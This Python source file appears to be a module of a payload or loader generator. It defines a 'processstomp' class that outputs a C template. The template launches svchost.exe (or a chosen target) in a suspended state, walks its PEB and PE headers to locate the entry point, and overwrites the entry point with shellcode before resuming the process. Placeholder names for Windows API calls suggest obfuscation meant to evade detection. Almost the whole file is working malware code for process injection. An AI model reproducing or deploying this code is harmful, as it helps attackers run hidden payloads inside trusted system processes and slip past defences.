from string import Template

class processstomp:
    def __init__(self, arguments):
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
    {transformers}

    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    PROCESS_BASIC_INFORMATION pbi;

    memset(&pbi, 0, sizeof(pbi));

    {NtQueryInformationProcess}(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    PPEB pPeb = pbi.PebBaseAddress;

    PVOID pImage;
    SIZE_T NumberOfBytesRead;
    {ReadProcessMemory}(pi.hProcess, &pPeb->ImageBaseAddress, &pImage, sizeof(pImage), &NumberOfBytesRead);    
    LONG e_lfanew;  
    {ReadProcessMemory}(pi.hProcess, (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew), &e_lfanew, sizeof(e_lfanew), &NumberOfBytesRead);
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
    
    DWORD AddressOfEntryPoint;
    {ReadProcessMemory}(pi.hProcess, (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint), &AddressOfEntryPoint, sizeof(AddressOfEntryPoint), &NumberOfBytesRead);
    PVOID pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
    
    {WriteProcessMemory}(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);

    {ResumeThread}(pi.hThread);

    {CloseHandle}(pi.hThread);
    {CloseHandle}(pi.hProcess);

""").substitute(target=self.target)